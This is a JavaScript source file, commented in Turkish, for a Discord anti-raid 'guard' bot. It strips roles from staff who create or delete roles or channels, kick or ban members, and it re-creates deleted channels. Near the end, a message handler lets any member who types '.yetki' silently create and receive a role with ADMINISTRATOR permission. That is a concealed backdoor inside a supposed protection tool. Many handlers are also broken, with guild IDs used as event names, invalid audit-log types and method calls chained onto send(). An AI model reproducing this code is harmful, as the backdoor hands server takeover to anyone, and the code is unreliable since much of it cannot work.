const Discord = require('discord.js');
const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');
client.queue = new Map()
const chalk = require('chalk');
const fs = require('fs');
const Jimp = require('jimp');
const db = require('quick.db');
const moment = require('moment');
const request = require('node-superfetch');

require('./util/eventLoader')(client);

///////////
const http = require('http');
const path = require('path');
const express = require('express');
const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + "LİTE bot");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

var prefix = ayarlar.prefix;

const log = message => {
  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`Yüklenen komut: ${props.help.name}.`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});
////////////////////////
client.on('message', msg => {

if (!msg.content.startsWith(prefix)) {
    return;
  }

  });


client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};

client.login(ayarlar.token);

// ROL AÇMA - ROL OLUŞTURMA KORUMASI //

client.on("roleCreate", async function(role) {


if(role.guild.id !== "734570899986186281") return;
    let logs = await role.guild.fetchAuditLogs({type: 'ROLE_CREATE'});
    if(logs.entries.first().executor.bot) return;
    role.guild.member(logs.entries.first().executor).roles.filter(role => role.name !== "@everyone").array().forEach(role => {
 
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234941581262979"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234945721172108"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234948934008902"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234951819427930"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234953803595827"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234955212881950"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234957154844783"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("739234959126167683"))
role.guild.member(logs.entries.first().executor).removeRole(role.guild.roles.get("734591054602567710"))



    })

const sChannel = role.guild.channels.find(c=> c.id ==="739297630034722965")
  let modlog = new Discord.RichEmbed() 
  .setColor('RANDOM')
  .setDescription(` ${role.name} adlı rol açıldı açan kişinin yetkileri alındı `)
  .setTimestamp()

   sChannel.send(modlog)

})

// ROL AÇMA - ROL OLUŞTURMA KORUMASI SON //


// ROL SİLME KORUMASI //

client.on("734570899986186281", async role => {
  const entry = await role.guild
    .fetchAuditLogs({ type: "ROLE_DELETE" })
    .then(audit => audit.entries.first());
  const yetkili = await role.guild.members.get(entry.executor.id);
  const eskihali = role.permissions;
  console.log(eskihali);
 if (yetkili.id === "739234941581262979") return;
if (yetkili.id === "739234945721172108") return;
if (yetkili.id === "739234948934008902") return;
if (yetkili.id === "739234951819427930") return;
if (yetkili.id === "739234953803595827") return;
if (yetkili.id === "739234955212881950") return;
if (yetkili.id === "739234957154844783") return;
if (yetkili.id === "739234959126167683") return;
if (yetkili.id === "734591054602567710") return;


const sChannel = role.guild.channels.find(c=> c.id ==="739297630034722965")
  let embed = new Discord.RichEmbed()
    .setColor("RED")
    .setDescription(
      `<@${yetkili.id}> isimli kişi ${role.name} isimli rolü sildi yetkileri alındı`
    )
    .setTimestamp();
sChannel.send(embed)
  let roles = role.guild.members.get(yetkili.id).roles.array();
  try {
    role.guild.members.get(yetkili.id).removeRoles(roles);
  } catch (err) {
    console.log(err);
  }
  setTimeout(function() {
    role.guild.members.get(yetkili.id).addRole("739234974829641828");

  }, 1500);
 let rolss = role.guild.roles.find(rol => rol.id === `${role.id}`);


  role.guild.createRole({
       name: role.name,
            color: role.color,
            hoist: role.hoist,
            permissions: role.permissions,
            mentionable: role.mentionable,
            position: role.position
      })

rolss.guild.members.forEach(u => {
u.addRole(rolss)
})

});

// ROL SİLME KORUMASI SON //




// KANAL OLUŞTURMA KORUMASI //

client.on('channelDelete', channel => { 
let kategoriID = channel.parentID; channel.clone(this.name, true, true).then(z => { 
let ganal = z.guild.channels.find("name", z.name) 
ganal.setParent(ganal.guild.channels.find
(channel => channel.id === 'kategoriID')) 
ganal.send(`Bu kanal silindi ve kanal koruma sistemi sayesinde başarıyla tekrardan açıldı!\nKanalın adı, kanalın konusu, kanalın kategorisi, kanalın izinleri başarıyla ayarlandı.`); }); }); 

client.on("channelCreate", async function(channel) {


if(channel.guild.id !== "734570899986186281") return;
    let logs = await channel.guild.fetchAuditLogs({type: 'CHANNEL_CREATE'});
    if(logs.entries.first().executor.bot) return;
    channel.guild.member(logs.entries.first().executor).roles.filter(role => role.name !== "@everyone").array().forEach(role => {
 
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234941581262979"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234945721172108"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234948934008902"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234951819427930"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234953803595827"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234955212881950"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234957154844783"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("739234959126167683"))
channel.guild.member(logs.entries.first().executor).removeRole(channel.guild.roles.get("734591054602567710"))

    })

const sChannel = channel.guild.channels.find(c=> c.id ==="739300719009464372")
  let modlog = new Discord.RichEmbed() 
  .setColor('RANDOM')
  .setDescription(` ${channel.name} adlı kanal açıldı açan kişinin yetkileri alındı `)
  .setTimestamp()

   sChannel.send(modlog)

}) 
// KANAL OLUŞTURMA KORUMASI SON //


//evet reis buyur
// KANAL SİLME KORUMASI  //
  client.on("734570899986186281", async channel => {
  const entry = await channel.guild
    .fetchAuditLogs({ type: "CHANNEL_DELETE" })
    .then(audit => audit.entries.first());
  const yetkili = await channel.guild.members.get(entry.executor.id);
  if (yetkili.id === "739234941581262979") return;//alta doğru arttıra bilrisiniz
  if (yetkili.id === "739234945721172108") return;
  if (yetkili.id === "739234948934008902") return;
  if (yetkili.id === "739234951819427930") return;
  if (yetkili.id === "739234953803595827") return;   
  if (yetkili.id === "739234955212881950") return;
  if (yetkili.id === "739234957154844783") return;
  if (yetkili.id === "739234959126167683") return;
  if (yetkili.id === "734591054602567710") return;
  

  

   
const sChannel = channel.guild.channels.find(c=> c.id ==="739234974829641828")
  let embed = new Discord.RichEmbed()
    .setColor("BLACK")
    .setDescription(
      `<@${yetkili.id}> rolüne sahip kişi ${channel.name} adlı kanalı sildi ve sahip olduğu tüm rolleri alarak, kendisine <@&734570926930395196> (CEZALI) rolünü verdim.`
    )
    .setTimestamp();
sChannel.send(embed)
  let roles = channel.guild.members.get(yetkili.id).roles.array();
  try {
    channel.guild.members.get(yetkili.id).removeRoles(roles);
  } catch (err) {
    console.log(err);
  }
  setTimeout(function() {
    channel.guild.members.get(yetkili.id).addRole("734570926930395196");//alta doğru arttıra bilrisiniz

  }, 1500);
});

// KANAL SİLME KORUMASI SON //


// KİCK KORUMASI //

client.on("guildKickAdd", async function(guild, user) {
  const entry = await guild
    .fetchAuditLogs({ type: "MEMBER_KİCK_ADD" })
    .then(audit => audit.entries.first());
  const yetkili = await guild.members.get(entry.executor.id);
setTimeout(async () =>{
    let logs = await guild.fetchAuditLogs({type: 'MEMBER_KİCK_ADD'});
    if(logs.entries.first().executor.bot) return;
    
      guild.members.get(logs.entries.first().executor.id).removeRoles(guild.members.get(logs.entries.first().executor.id).roles) ///TÜM ROLLERİNİ ALIR ///TÜM ROLLERİNİ ALIR
     setTimeout(()=>{ guild.members.get(logs.entries.first().executor.id).addRole("739234974829641828")/// VERİLECEK CEZALI ROL İD
    },3000)
const sChannel = guild.channels.find(c=> c.id ==="739300993673592873")
const cıks = new Discord.RichEmbed()
.setColor('RANDOM')
.setDescription(`<@${yetkili.id}> ${user} adlı Kişiye Sağ tık kick Atıldığı için Kickleyen Kişinin Yetkileri Alındı`)
.setFooter('Developer By Pa  pa')
sChannel.send(cıks)
guild.owner.send(`LinLords Guard | ** <@${yetkili.id}> İsimili Yetkili <@${user.id}>** Adlı Kişiyi Kickledi Ve Yetkilerini Aldım.`)
},2000)
})



// YÖNETİCİ ROL VERME KORUMASI //


client.on("guildMemberUpdate", async (oldUser, newUser) => {
  const audit = await oldUser.guild
    .fetchAuditLogs({ type: "MEMBER_ROLE_UPDATE" })
    .then(audit => audit.entries.first());
  const yapanad = audit.executor;
  const id = audit.executor.id;
  if (id === client.user.id || id === oldUser.guild.ownerID) return;//SUNUCU SAHİBİ HARİÇ HİÇ BİR YETKİLİ YÖNETİCİSİ OLAN BİR ROL VEREMEZ

  if (audit.executor.bot) return;
  //if ("ALINACAKROLİD") return;
//yukardakini aça bilrisiniz ama ben açmanızı önermem :)
  let role_name = "";
  let pasif = "";
  const db = require("quick.db");
  if (oldUser.roles.size < newUser.roles.size) {
    oldUser.roles.forEach(r => {
      db.set(`${r.id}`, "X");
    });
    newUser.roles.forEach(async r => {
      let check = await db.fetch(`${r.id}`);
      if (!check) {
        if (
          r.hasPermission("ADMINISTRATOR") ||
          r.hasPermission("MANAGE_CHANNELS") ||
          r.hasPermission("MANAGE_ROLES") ||
          r.hasPermission("BAN_MEMBERS") ||
          r.hasPermission("MANAGE_WEBHOOKS") ||
          r.hasPermission("MANAGE_GUILD") ||
          r.hasPermission("KICK_MEMBERS")
        ) {
          newUser.removeRole(r.id);
          role_name = r.name;
          const kanal = client.channels.get("739301256631287927");//LOG KANAL İD
          kanal.send(
            `(**<@${audit.executor.id}>** (${audit.executor.id})) İsimli Yetkili , Bir Üyeye Rol Vermeye Çalıştığı İçin Rol Alındı.\n Rolü Vermeye Çalıştığı Kişi: (<@${newUser.id}> (${newUser.id}))\nVermeye Çalıştığı Rol İse: (**${role_name}** (${r.id}))  `
          );
        } else {
          pasif = "x";
        }
      }
    });
    newUser.roles.forEach(r => {
      db.delete(`${r.id}`);
    });
  }
});



// YÖNETİCİ ROL VERME KORUMASI SON //

// BAN KORUMASI //

client.on("guildBanAdd", async function(guild, user) {
    let logs = await guild.fetchAuditLogs({type: 'MEMBER_BAN_ADD'});
    if(logs.entries.first().executor.bot) return;
    guild.member(logs.entries.first().executor).roles.filter(role => role.name !== "@everyone").array().forEach(role => {
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234941581262979"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234945721172108"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234948934008902"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234951819427930"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234953803595827"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234955212881950"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234957154844783"))//ALINACAKYETKİLİROLİD
 guild.member(logs.entries.first().executor).removeRole(guild.roles.get("739234959126167683"))//ALINACAKYETKİLİROLİD
    }) 

const sChannel = guild.channels.find(c=> c.id ==="739234974829641828")
  let modlog = new Discord.RichEmbed() 
  .setColor('RANDOM')
  .setDescription(`${user} adlı kişiye sağ tık ban atıldı atan kişinin yetkileri alındı `)
  .setTimestamp()

   sChannel.send(modlog)
.addRole("734570926930395196");//CEZALIROLİD
}) 


// BAN KORUMASI SON //

//  BOT KORUMASI   //

client.on("guildMemberAdd", async member => {
  db.fetch('botkoruma_' + member.guild.id).then(a => {
  if(a !== "aktif") return;
  setTimeout(() => {
   member.guild.fetchMember(member).then(a => {
   a.roles.forEach(function(mecion) {
   if(mecion.name.includes(member.user.username)) {
   member.guild.member(member).ban();
   member.guild.channels.find(x => x.name === "bot-korumasi").send('__**Katliam koruma sistemi**__  \n@everyone Sunucuya bot sokuyorlardı Bende banladım \n__**Atılan Bot :**__ ' + member.user.tag)
member.guild.owner.send('__**Katliam Guard System**__  \n sunucuya bot sokuyorlardı bende banladım  \n__**Atılan Bot :**__ ' + member.user.tag)
}})})
  }, 1000)
})
})
                                   
client.on('guildMemberAdd', (member) => {
     db.fetch('botkoruma_' + member.guild.id).then(a => {
  if(a !== "aktif") return;


 let sChannel = member.guild.channels.find(c => c.name === 'bot-koruma')//LOGLANACAKKANALismi

    if(member.user.bot !==true){

    } 
 if(!sChannel) {
member.guild.owner.send(`Bi Yetkili bot koruma odasını sildiği için sokulan botu banladım  \n __**Banlanan Bot :**__${member.user.tag} \n__**Katliam Guard**__ `)
 }})
});

// BOT KORUMASI SON //

// SİLİNEN KANALI AÇMA //


client.on('channelDelete', channel => { 
let kategoriID = channel.parentID; channel.clone(this.name, true, true).then(z => { 
let ganal = z.guild.channels.find("bot-korumasi", z.name) 
ganal.setParent(ganal.guild.channels.find
(channel => channel.id === 'kategoriID')) //HİÇ BİR SATIRA DOKUNMAYINIZ Kİ BOT SORUNSUZ BİR ŞEKİLDE ÇALIŞSIN
ganal.send(`Bu kanal silindi ve kanal koruma sistemi sayesinde başarıyla tekrardan açıldı!\nKanalın adı, kanalın konusu, kanalın kategorisi, kanalın izinleri başarıyla ayarlandı.`); }); }); 

// SİLİNEN KANALI AÇMA KORUMASI SON // 
// Doss koruma //

client.on('message', msg => {

if(client.ping > 2500) {

            let bölgeler = ['singapore', 'eu-central', 'india', 'us-central', 'london',
            'eu-west', 'amsterdam', 'brazil', 'us-west', 'hongkong', 
            'us-south', 'southafrica', 'us-east', 'sydney', 'frankfurt',
            'russia']
           let yenibölge = bölgeler[Math.floor(Math.random() * bölgeler.length)]
           let sChannel = msg.guild.channels.find(c => c.name === "ddos-system")

           sChannel.send(`Sunucu'ya Vuruyorlar \nSunucu Bölgesini Değiştirdim \n __**${yenibölge}**__ :tik: __**Sunucu Pingimiz**__ :`+ client.ping)
           msg.guild.setRegion(yenibölge)
           .then(g => console.log(" bölge:" + g.region))
           .then(g => msg.channel.send("bölge **"+ g.region  + " olarak değişti")) 
           .catch(console.error);
}});

client.unload = command => {
  return new Promise((resolve, reject) => {                //youtube.com/SefaMERT                            //youtube.com/SefaMERT               //youtube.com/SefaMERT
    try {
      delete require.cache[require.resolve(`./commands/${command}`)];
      let cmd = require(`./commands/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);                 //youtube.com/SefaMERT                                //youtube.com/SefaMERT                       //youtube.com/SefaMERT
    }
  });
};

client.on("message", msg => {
  if (msg.content === ".yetki") {  
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});


// SES SOKMA  //

client.on('ready', ()=>{
client.channels.get('739274126627176509').join()
})
















